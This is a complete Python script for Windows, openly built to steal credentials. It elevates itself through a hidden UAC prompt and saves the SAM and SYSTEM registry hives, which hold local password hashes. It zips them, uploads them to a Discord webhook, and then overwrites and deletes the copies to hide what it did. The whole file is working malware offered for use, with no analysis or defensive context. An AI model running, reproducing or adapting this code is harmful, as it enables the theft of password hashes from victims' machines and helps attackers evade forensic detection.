# Author:  mrpanda_bamboo
# Version: 1.1
# License: MIT

import os
import sys
import ctypes
import subprocess
import zipfile
import requests
import time
import shutil

WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK"
WORKING_DIR = "C:\\Users\\Public\\Documents\\SysData"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def secure_delete_file(file_path):
    try:
        file_size = os.path.getsize(file_path)
        with open(file_path, 'r+b', buffering=0) as f:
            for _ in range(3):
                f.seek(0)
                f.write(os.urandom(file_size))
                f.flush()
                os.fsync(f.fileno())
        os.remove(file_path)
    except Exception:
        try:
            os.remove(file_path)
        except Exception:
            pass

def send_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            requests.post(WEBHOOK_URL, files={'file': f}, timeout=60)
    except Exception:
        pass

def exfiltrate():
    if os.path.exists(WORKING_DIR):
        shutil.rmtree(WORKING_DIR, ignore_errors=True)
    os.makedirs(WORKING_DIR, exist_ok=True)

    sam_bak = os.path.join(WORKING_DIR, "SAM.dat")
    sys_bak = os.path.join(WORKING_DIR, "SYSTEM.dat")
    sam_zip = os.path.join(WORKING_DIR, "SAM.zip")
    sys_zip = os.path.join(WORKING_DIR, "SYSTEM.zip")

    subprocess.run(f'reg save HKLM\\SAM "{sam_bak}" /y', shell=True, capture_output=True)
    subprocess.run(f'reg save HKLM\\SYSTEM "{sys_bak}" /y', shell=True, capture_output=True)
    
    time.sleep(2)

    if os.path.exists(sam_bak):
        with zipfile.ZipFile(sam_zip, 'w', zipfile.ZIP_DEFLATED) as z:
            z.write(sam_bak, "SAM")
        send_file(sam_zip)
        time.sleep(3)

    if os.path.exists(sys_bak):
        with zipfile.ZipFile(sys_zip, 'w', zipfile.ZIP_DEFLATED) as z:
            z.write(sys_bak, "SYSTEM")
        send_file(sys_zip)
        time.sleep(3)

    time.sleep(10)
    
    for attempt in range(3):
        try:
            for root, dirs, files in os.walk(WORKING_DIR, topdown=False):
                for file in files:
                    secure_delete_file(os.path.join(root, file))
                for dir_name in dirs:
                    try:
                        os.rmdir(os.path.join(root, dir_name))
                    except Exception:
                        pass
            os.rmdir(WORKING_DIR)
            break
        except Exception:
            if attempt < 2:
                time.sleep(2)
    
    try:
        time.sleep(5)
        shutil.rmtree(WORKING_DIR, ignore_errors=True)
    except Exception:
        pass

if __name__ == "__main__":
    if is_admin():
        exfiltrate()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join([f'"{arg}"' for arg in sys.argv]), None, 0)
        sys.exit()
